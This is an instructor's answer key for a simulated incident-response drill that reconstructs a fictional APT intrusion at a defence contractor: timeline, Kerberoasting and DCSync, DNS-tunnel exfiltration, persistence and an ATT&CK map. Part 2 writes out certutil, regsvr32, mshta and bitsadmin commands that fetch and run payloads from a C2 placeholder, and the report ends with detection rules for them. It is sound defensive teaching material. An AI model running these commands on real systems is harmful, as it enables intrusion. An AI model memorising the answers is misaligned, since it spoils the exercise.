# Drill 01 Advanced Solution: APT Multi-Stage Investigation

## Instructor Guide

This solution contains the complete expected findings for the SILVERLEAF APT investigation.

---

## Part 1 Solution: Establishing the Breach Timeline

### First Compromise Event: Day -45 (45 days before detection)

The earliest suspicious activity is a spear-phishing email sent to `k.ortiz@defenceco.local` (Lead Engineer, Project REDSTONE) from `admin@documents-secure.net` with attachment `Technical_Specification_Review.pdf` — 45 days before detection.

**Campaign progression:**

* Day -45: Phishing to k.ortiz — PDF exploit, first C2 beacon
* Day -38: Phishing to j.henderson (CTO) — same actor, different lure
* Day -30: ADFS certificate enumeration from k.ortiz's workstation
* Day -28: Kerberoasting (6 service accounts targeted)
* Day -20: DCSync from compromised workstation using svc_azure account
* Day -15: Access to REDSTONE project share
* Day -12: DNS tunneling exfiltration begins
* Day -7: REDSTONE_Phase2_Architecture.pdf accessed
* Day -5: Last C2 beacon before detection
* Day 0: External tip-off triggers compromise assessment

**Key insight:** 45-day dwell time with stealthy LOLBin usage and DNS tunneling explains why standard detections didn't fire.

### DNS C2 Domain

The DNS tunneling base domain: `update-telemetry.net`

Query pattern: `[16-char hex].cdn.update-telemetry.net` — High entropy subdomain labels of 16 hex characters are characteristic of DNS tunneling tools (dnscat2, iodine).

---

## Part 2 Solution: Full Kill Chain

### Living-off-the-Land Execution (LOLBins)

Confirmed LOLBins used:

1. **certutil.exe** — downloading second-stage payload: `certutil.exe -urlcache -f http://[C2]/stage2.bin stage2.bin`
1. **regsvr32.exe** — executing reflective DLL: `regsvr32.exe /s /n /u /i:http://[C2]/implant.sct scrobj.dll`
1. **mshta.exe** — executing HTA from C2: `mshta.exe http://[C2]/update.hta`
1. **bitsadmin.exe** — background download: `bitsadmin /transfer /download /priority FOREGROUND http://[C2]/tools.cab tools.cab`

**Stealthy characteristics:**

* All binaries are Microsoft-signed → bypasses application whitelisting
* All network connections from "legitimate" Windows processes → less suspicious in firewall logs
* No third-party tools dropped to disk initially

---

## Part 3 Solution: Credential Access

### Kerberoasting
6 service accounts targeted with RC4 ticket requests:

* `svc_azure`, `svc_backup`, `svc_sql`, `svc_print`, `svc_app`, `svc_report`

**Critical:** `svc_azure` (Azure AD Sync account) was successfully cracked — weak password.
This gave the attacker Azure AD sync privileges → can create forged SAML tokens.

### DCSync
From `WS-KORTIZ`, using compromised `svc_azure` credentials, the attacker performed DCSync (`DS-Replication-Get-Changes-All` privilege) — extracting password hashes for ALL domain accounts.

**This is total domain compromise.** All passwords must be rotated.

---

## Part 4 Solution: REDSTONE Document Exfiltration

**Access chain:**

1. Attacker authenticated to project share `\\FILE-SRV01\Projects\REDSTONE\` using `k.ortiz` credentials
1. `REDSTONE_Phase2_Architecture.pdf` accessed and read (Event 4663)
1. File staged to `C:\Users\kortiz\AppData\Local\Temp\tmp_4829.pdf` (renamed)
1. Exfiltrated via DNS tunneling over `update-telemetry.net`
   * File was base64-encoded and chunked into DNS query subdomain labels
   * Total exfiltration: 47 DNS TXT queries containing file chunks

---

## Part 5 Solution: Persistence Mechanisms

**4 persistence mechanisms found:**

1. **Registry Run key** — `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` → `WindowsDefenderUpdate` pointing to `%TEMP%\wdupdate.exe`

1. **WMI Event Subscription** — `__EventFilter` + `CommandLineEventConsumer` triggering on system logon to re-launch implant if killed

1. **Scheduled Task** — `\Microsoft\Windows\UpdateOrchestrator\Schedule_Backup` — runs every 4 hours with `regsvr32.exe` LOLBin launch chain

1. **Service** — `WinDefAdvanced` service — looks legitimate, executes implant DLL as SYSTEM

---

## Part 6 Solution: Full ATT&CK Map

```text
Tactic               | ID        | Technique                              | Conf | Evidence
─────────────────────┼───────────┼────────────────────────────────────────┼──────┼──────────
Reconnaissance       | T1598.003 | Spearphishing Link (pre-phishing recon)| MED  | Actor forum
Initial Access       | T1566.001 | Spearphishing Attachment (PDF)          | HIGH | Email log
Execution            | T1204.002 | User Execution: Malicious File          | HIGH | Acrobat→PS
Execution            | T1059.001 | PowerShell                              | HIGH | Sysmon
Execution            | T1218.011 | Signed Binary Proxy: Regsvr32          | HIGH | Sysmon
Defense Evasion      | T1218.011 | Regsvr32 LOLBin                         | HIGH | Sysmon
Defense Evasion      | T1027     | Obfuscated Files (DNS tunneling enc)    | HIGH | DNS logs
Defense Evasion      | T1036.005 | Masquerading: Match Legitimate Name     | HIGH | WdUpdate.exe
Persistence          | T1547.001 | Registry Run Keys                       | HIGH | Sysmon reg
Persistence          | T1053.005 | Scheduled Task                          | HIGH | Sysmon task
Persistence          | T1543.003 | Create/Modify System Process: Service   | HIGH | Event 7045
Persistence          | T1546.003 | WMI Event Subscription                  | HIGH | Sysmon 19-21
Priv Escalation      | T1558.003 | Kerberoasting                           | HIGH | Event 4769
Priv Escalation      | T1484.002 | Domain Trust Modification (ADFS)        | HIGH | ADFS events
Credential Access    | T1003.006 | DCSync                                  | HIGH | Event 4662
Credential Access    | T1558.003 | Kerberoasting                           | HIGH | Event 4769
Discovery            | T1087.002 | Domain Account Discovery                | HIGH | Sysmon cmd
Discovery            | T1482     | Domain Trust Discovery                  | HIGH | nltest cmd
Lateral Movement     | T1021.002 | SMB Lateral Movement                    | HIGH | Event 4624
Collection           | T1213     | Data from Info Repositories             | HIGH | File access
C2                   | T1071.004 | DNS C2                                  | HIGH | DNS tunneling
C2                   | T1573.002 | HTTPS Encrypted Channel                 | HIGH | Beacon
Exfiltration         | T1048.001 | Exfil over DNS Tunneling                | HIGH | DNS logs
```

---

## Part 7 Solution: Intelligence Report

### SILVERLEAF Actor Profile — Campaign Against DefenseCo

**Summary:**
SILVERLEAF conducted a 45-day targeted intrusion campaign against DefenseCo, a defense contractor.
The actor used a spear-phishing PDF exploit for initial access, followed by an extended living-off-the-land campaign using only Microsoft-signed binaries to evade detection.
The actor achieved full domain compromise via DCSync and exfiltrated at least one classified project document via DNS tunneling.

**Stealthiness factors:**

1. LOLBins only — no third-party tools → evades AV, AppLocker
1. DNS tunneling — bypasses most proxy/DLP solutions
1. Low-and-slow activity — spread over 45 days
1. Minimal footprint — staged in user temp directories
1. Targeting `svc_azure` → cloud pivot capability

**Key IOCs:**

* C2 Domain: `update-telemetry.net`
* Phishing domain: `documents-secure.net`
* DNS tunneling: `*.cdn.update-telemetry.net`
* Implant: `wdupdate.exe` (MD5: [hash])

**Top 5 Detection Rules to Block SILVERLEAF:**

1. Alert on DNS queries with >12-character hex subdomain labels
1. Alert on `regsvr32.exe /i:http` pattern (remote SCT execution)
1. Alert on `certutil.exe -urlcache` (download via LOLBin)
1. Alert on Event 4662 for `DS-Replication-Get-Changes-All` by non-DC accounts
1. Alert on ADFS token signing certificate export events
